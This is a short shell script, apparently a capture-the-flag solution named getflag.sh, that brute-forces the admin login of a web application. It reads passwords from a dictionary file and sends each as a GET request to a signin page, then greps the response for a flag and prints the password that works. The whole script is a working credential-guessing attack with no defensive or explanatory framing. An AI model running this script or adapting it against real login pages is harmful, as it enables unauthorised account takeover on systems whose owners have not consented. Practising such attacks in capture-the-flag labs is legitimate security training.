# /bin/sh

if [ -z "$1" ]; then
	echo "Usage: sh getflag.sh [server_ip]"
	exit 1
fi

for password in $(cat ./dictionary.txt)
do
	flag=$(curl -s -X GET  "http://$1/?page=signin&username=admin&password=${password}&Login=Login" | grep flag)
	if [ ! -z "${flag}" ]; then
		echo "SUCCESS with password: ${password}"
		echo "${flag}"
	 	exit 0
	else
		echo "FAIL with password: ${password}"
	fi
done